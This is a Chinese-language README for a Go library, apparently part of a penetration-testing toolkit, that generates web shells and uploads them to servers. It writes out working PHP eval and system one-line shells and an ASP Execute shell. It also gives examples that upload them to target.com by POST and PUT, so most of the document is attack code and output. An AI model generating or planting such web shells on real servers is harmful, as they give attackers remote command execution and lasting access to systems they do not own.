# webshell - 测试用 Webshell 生成与上传

网络安全渗透测试的 Webshell 生成与自动上传工具库。

## 引入

```go
import "github.com/xiguayiqiu/gyscan_code/webshell"
```

---

## 函数总览

### 生成函数

| 函数 | 说明 |
|------|------|
| `webshell.Generate(lang, pass)` | 按语言类型生成 webshell |
| `webshell.GeneratePHP(pass)` | PHP 一句话木马 `eval($_POST['pass'])` |
| `webshell.GeneratePHPCMD(pass)` | PHP 命令执行 `system($_REQUEST['cmd'])` |
| `webshell.GeneratePHPB64(pass)` | PHP base64 解码执行 |
| `webshell.GeneratePHPFileManager(pass)` | PHP 文件管理类型 |
| `webshell.GenerateASP(pass)` | ASP 木马 `Execute(Request.Form("pass"))` |
| `webshell.GenerateASPX(pass)` | ASPX C# 命令执行 |
| `webshell.GenerateJSP(pass)` | JSP 命令执行 |
| `webshell.GenerateAll(pass)` | 生成所有语言类型 |

### 上传函数

| 函数 | 说明 |
|------|------|
| `webshell.Upload(url, content)` | POST multipart 上传 |
| `webshell.UploadAs(url, content, filename)` | 指定文件名上传 |
| `webshell.UploadWithField(url, content, filename, field)` | 指定表单字段名上传 |
| `webshell.UploadViaPUT(url, content)` | PUT 方式上传 |
| `webshell.UploadViaPOST(url, content)` | POST 原始内容上传 |
| `webshell.UploadWithClient(client, url, content)` | 使用自定义客户端上传 |

### 辅助方法

| 方法 | 说明 |
|------|------|
| `Lang.String()` | 返回语言名称 `"php"`, `"asp"` 等 |
| `Lang.Ext()` | 返回文件扩展名 `".php"`, `".asp"` 等 |

---

## 使用示例

### 生成 PHP Webshell

```go
code := webshell.GeneratePHP("pass")
fmt.Println(code)
// 输出: <?php @eval($_POST['pass']);?>
```

```go
code := webshell.GeneratePHPCMD("cmd")
fmt.Println(code)
// 输出: <?php system($_REQUEST['cmd']);?>
```

### 生成 ASP Webshell

```go
code := webshell.GenerateASP("pass")
fmt.Println(code)
// 输出:
// <%
// Dim c : c = Request.Form("pass")
// If c <> "" Then
//     Execute(c)
// End If
// %>
```

### 生成 ASPX Webshell

```go
code := webshell.GenerateASPX("pass")
fmt.Println(code)
```

### 生成 JSP Webshell

```go
code := webshell.GenerateJSP("cmd")
fmt.Println(code)
```

### 按类型生成

```go
code := webshell.Generate(webshell.PHP, "pass")
fmt.Println(code)
// 输出: <?php @eval($_POST['pass']);?>
```

### 生成全部语言

```go
all := webshell.GenerateAll("pass")
for lang, code := range all {
    fmt.Printf("[%s]\n%s\n\n", lang, code)
}
```

### 上传 Webshell

```go
// 生成 PHP webshell
code := webshell.GeneratePHP("pass")

// 上传到目标
err := webshell.Upload("http://target.com/upload.php", code)
if err != nil {
    fmt.Println("上传失败:", err)
} else {
    fmt.Println("上传成功")
}
```

### 指定文件名和字段名

```go
code := webshell.GeneratePHP("pass")
err := webshell.UploadWithField("http://target.com/upload.php", code, "shell.php", "file")
```

### PUT 方式上传

```go
code := webshell.GeneratePHP("pass")
err := webshell.UploadViaPUT("http://target.com/shell.php", code)
```

---

## License

Apache License 2.0
